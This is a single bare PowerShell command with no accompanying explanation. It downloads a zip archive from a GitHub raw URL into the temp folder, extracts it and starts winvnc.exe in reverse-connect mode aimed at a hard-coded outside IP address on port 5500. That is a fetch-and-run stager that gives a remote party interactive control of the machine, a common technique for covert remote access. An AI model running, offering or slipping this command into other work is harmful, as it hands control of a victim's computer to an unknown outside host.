Invoke-WebRequest -Uri "https://raw.githubusercontent.com/julkenny/test/refs/heads/main/vnc.zip" -OutFile "$env:TEMP\vnc.zip"; Expand-Archive -Path "$env:TEMP\vnc.zip" -DestinationPath "$env:TEMP\"; Start-Process -FilePath "$env:TEMP\vnc\winvnc.exe" -ArgumentList "-autoreconnect ID:1001 -connect 82.65.25.147:5500 -run"
